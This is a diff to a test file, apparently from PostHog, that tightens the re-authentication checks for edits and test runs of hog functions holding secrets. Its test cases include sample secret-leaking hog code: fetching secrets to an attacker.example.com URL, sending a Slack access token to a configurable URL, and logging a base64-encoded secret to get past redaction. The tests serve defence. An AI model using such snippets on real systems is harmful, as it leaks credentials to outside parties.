@@ -1389,8 +1389,9 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
 
     @parameterized.expand(
         [
-            ("unchanged_url", {}, {"secret": True}, True, 200),
-            ("body_change", {"body": {"value": "changed"}}, {"secret": True}, True, 200),
+            ("unchanged", {}, {"secret": True}, True, 200),
+            # No input is safe to change: code can pick its URL from any of them.
+            ("body_change", {"body": {"value": "changed"}}, {"secret": True}, True, 403),
             ("url_change", {"url": {"value": "https://new.example.com"}}, {"secret": True}, True, 403),
             ("url_change_omitted_secret", {"url": {"value": "https://new.example.com"}}, None, True, 403),
             # Entering the secret again in the same save moves nothing, so it needs no re-auth.
@@ -1425,6 +1426,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         }
         create = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=payload)
         assert create.status_code == 201, create.json()
+        create_inputs = HogFunction.objects.get(id=create.json()["id"]).inputs
 
         inputs = {**create.json()["inputs"], **input_changes}
         if secret_input is None:
@@ -1441,7 +1443,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         stored = HogFunction.objects.get(id=create.json()["id"])
         if expected_status == 403:
             assert res.json()["code"] == "sensitive_action_required_reauth"
-            assert (stored.inputs or {})["url"]["value"] == "https://example.com"
+            assert stored.inputs == create_inputs
         else:
             assert (stored.inputs or {})["url"]["value"] == input_changes.get("url", {"value": "https://example.com"})[
                 "value"
@@ -1452,15 +1454,12 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
 
     @parameterized.expand(
         [
-            # The worker redacts the configured secrets out of logs, so this carries nothing out.
+            ("unchanged", "fetch('https://example.com', {'headers': {'Authorization': inputs.secret1}});", 200),
+            # Log redaction matches the raw value, so an encoded secret would reach the logs.
             (
-                "outside_the_fetch",
-                "fetch('https://example.com', {'headers': {'Authorization': inputs.secret1}});\nprint('sent')",
-                200,
-            ),
-            (
-                "inside_the_fetch",
-                "fetch('https://example.com', {'method': 'PUT', 'headers': {'Authorization': inputs.secret1}});",
+                "logs_an_encoded_secret",
+                "fetch('https://example.com', {'headers': {'Authorization': inputs.secret1}});\n"
+                "print(base64Encode(inputs.secret1))",
                 403,
             ),
             ("new_url", "fetch('https://new.example.com', {'body': inputs.secret1});", 403),
@@ -1554,8 +1553,8 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
     @parameterized.expand(
         [
             ("create", None, 403),
-            ("body_change", {"inputs": {"body": {"value": "changed"}}}, 200),
-            ("url_change", {"inputs": {"url": {"value": "https://attacker.example.com"}}}, 403),
+            ("body_change", {"inputs": {"body": {"value": "changed"}}}, 403),
+            ("rename", {"name": "Renamed"}, 200),
             (
                 "code_change",
                 {"hog": "fetch(inputs.url, {'body': inputs.slack.access_token}); print(inputs.slack)"},
@@ -1592,7 +1591,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             assert res.json()["code"] == "sensitive_action_required_reauth"
 
     @SECRET_BINDING_ENFORCED
-    def test_non_string_hog_is_rejected_rather_than_traced(self) -> None:
+    def test_test_run_of_an_edited_config_needs_recent_authentication(self) -> None:
         payload = {
             "type": "destination",
             "name": "Fetch URL",
@@ -1605,13 +1604,25 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         }
         create = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=payload)
         assert create.status_code == 201, create.json()
+        self._age_session(settings.SESSION_INTEGRATION_LINK_AGE + 60)
 
-        res = self.client.patch(
-            f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}",
-            data={"hog": ["not", "code"], "inputs": {**payload["inputs"], "api_key": {"secret": True}}},
-        )
+        # The worker merges the stored secret over the dummy one, so the dummy does not make it a new credential.
+        with patch("products.cdp.backend.api.hog_function.create_hog_invocation_test") as invoke:
+            res = self.client.post(
+                f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}/invocations",
+                data={
+                    "configuration": {
+                        **payload,
+                        "inputs": {"url": {"value": "https://attacker.example.com"}, "api_key": {"value": "dummy"}},
+                    },
+                    "mock_async_functions": False,
+                    "globals": {},
+                },
+            )
 
-        assert res.status_code == 400, res.json()
+        assert res.status_code == 403, res.json()
+        assert res.json()["code"] == "sensitive_action_required_reauth"
+        invoke.assert_not_called()
 
     @SECRET_BINDING_ENFORCED
     def test_integration_link_window_is_shorter_than_other_sensitive_actions(self) -> None:
